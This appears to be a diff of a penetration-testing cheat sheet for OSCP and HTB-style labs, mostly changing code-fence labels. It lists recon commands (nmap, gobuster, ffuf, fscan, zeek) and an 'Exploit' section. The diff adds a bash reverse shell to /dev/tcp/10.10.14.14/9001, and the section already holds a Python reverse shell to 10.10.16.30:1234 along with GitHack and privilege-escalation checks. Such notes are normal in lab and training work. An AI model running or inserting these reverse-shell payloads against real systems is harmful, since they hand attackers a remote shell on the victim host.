@@ -18,7 +18,7 @@ tags: [nmap,gobuster,ffuf,jadx,linpeas,OSCP]
 
 ### Nmap
 
-```console
+```shell
 nmap -sV -sC --min-rate=1000 -p- <IP> -o nmap
 ```
 
@@ -26,7 +26,7 @@ nmap -sV -sC --min-rate=1000 -p- <IP> -o nmap
 
 
 
-```console
+```shell
 Dirsearch
 gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP/DNS>
 Break status code
@@ -35,7 +35,7 @@ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP/DNS> -b <BREAK_STATU
 
 ### ffuf
 
-```console
+```shell
 Subdomain search
 ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H “Host: FUZZ.site.com” -u http://site.com
 ```
@@ -43,37 +43,43 @@ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H “Host: FUZ
 ### fscan
 Scan host in network
 Shadow1ng/fscan (github.com)
-```console
+```shell
 ./fscan -h 172.0.0.1/24
 ```
 
 ### Zeek with pcap
-```console
+```shell
 zeek -Cr 0.pcap
 ```
 However password in zeek is <hidden> to config for zeek to show in [Ippsec-Cap](https://www.youtube.com/watch?v=O_z6o2xuvlw)
 
 ### SSH Port Forwarding
 
-```console
+```shell
 ssh -L <PORT IN LOCAL>:<IP>:<PORT IN SERVER> username@<IP SERVER>
 ```
 
 # Exploit
 
+### Bash reverse shell
+
+```shell
+bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'
+```
+
 ### Python reverse shell
 
-```console
+```shell
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.30",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 ### Stable reverse shell
-```console
+```shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ### GitHack - Exploit ```.git``` 
  lijiejie/GitHack: Khai thác tiết lộ thư mục `.git` (github.com)
-```console
+```shell
 Githack
 python GitHack.py http://site.htb/.git/
 ```
@@ -83,7 +89,7 @@ python GitHack.py http://site.htb/.git/
 
 ### Check sudo file permissions
 
-```console
+```shell
 sudo -l
 ```
 
